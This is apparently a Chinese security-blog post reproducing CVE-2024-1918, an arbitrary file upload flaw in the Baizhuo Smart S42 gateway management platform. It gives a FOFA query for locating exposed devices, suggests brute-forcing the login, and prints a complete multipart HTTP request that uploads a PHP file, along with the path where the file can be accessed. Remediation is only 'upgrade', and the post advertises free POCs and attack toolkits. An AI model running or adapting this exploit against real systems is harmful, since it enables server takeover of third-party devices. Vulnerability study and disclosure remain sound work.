#  CVE-2024-1918   
原创 fgz  AI与网安   2024-02-29 07:00  
  
免  
责  
申  
明  
：**本文内容为学习笔记分享，仅供技术学习参考，请勿用作违法用途，任何个人和组织利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责，与作者无关！！！**  
  
  
  
01  
  
—  
  
漏洞名称  
  
  
  
北京百绰智能S42管理平台userattestation.php无限制上传  
漏洞  
  
  
  
02  
  
—  
  
漏洞影响  
  
  
北京百招智能S42管理平台在20240219之前的版本  
  
  
  
  
03  
  
—  
  
漏洞描述  
  
  
北京百卓网络技术有限公司（以下简称百卓网络）是一家致力于构建下一代安全互联网的高新技术企业。  
  
百卓网络Smart S42网关智能管理平台  
/useratte/userattestation.php接口处  
存在文件上传漏洞。  
攻击者可利用漏洞获取服务器权限，操作服务器文件。  
  
  
  
04  
  
—  
  
FOFA搜索语句  
  
  
```
title="Smart管理平台"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BMoVuOic0Q3j2eKPIRoWFvAAhVh3DmKiaFibUzw2KAG8436NAkBCYKl9Y0ZldLYz5eolt5CibaRC8rZzQ/640?wx_fmt=png&from=appmsg "")  
  
  
注意：直接用浏览器访问很可能打不开，可以在虚拟机中用浏览器访问。  
  
  
05  
  
—  
  
漏洞分析  
  
  
代码中进入hidwel分支，且代码125、126行的上传文件没有进行任何后缀限制，造成任意文件上传。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BMoVuOic0Q3j2eKPIRoWFvAAnBG0UcRib8RXGiaBGO6AR7Ym3XU7Y6EEOJfOv8acDyq67r65iaK4H9UlQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
06  
  
—  
  
漏洞复现  
  
  
首先登录系统  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BMoVuOic0Q3j2eKPIRoWFvAANg1Epia2OwwOLtwgd1IvxGwoI6MlQYXVg4pmAmn785KluseNJmUhHxg/640?wx_fmt=png&from=appmsg "")  
  
密码自行爆破  
  
  
文件上传数据包如下  
```
POST /useratte/userattestation.php HTTP/1.1
Host: 192.168.40.130:8443
Cookie: PHPSESSID=2174712c6aeda51c4fb6e6c5e6aaac50
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------42328904123665875270630079328
Content-Length: 592
Origin: https://192.168.40.130:8443
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="web_img"; filename="1.php"
Content-Type: application/octet-stream

<?php phpinfo();?>
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="id_type"

1
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="1_ck"

1_radhttp
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="hidwel"

set
-----------------------------42328904123665875270630079328
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BMoVuOic0Q3j2eKPIRoWFvAAcRCFkty4Ht3w8PKfgjYNM9XabgTKWmib9k70QXHeT33SBcAoibUVFqsw/640?wx_fmt=png&from=appmsg "")  
  
  
访问回显文件  
/boot/web/upload/weblogo/1.php  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BMoVuOic0Q3j2eKPIRoWFvAAQsIcN0yBP26ibj1LXe285NHW8GZvQmTIxQupq4cYBehicsx40obkWlJA/640?wx_fmt=png&from=appmsg "")  
  
漏洞复现完成  
  
  
  
  
  
07  
  
—  
  
修复建议  
  
  
升级到最新版本。  
  
  
08  
  
—  
  
新粉丝福利领取  
  
  
在公众号主页或者文章末尾点击发送消息免费领取。  
  
发送【  
电子书】关键字获取电子书  
  
发送【  
POC】关键字获取POC  
  
发送【  
工具】获取渗透工具包  
  
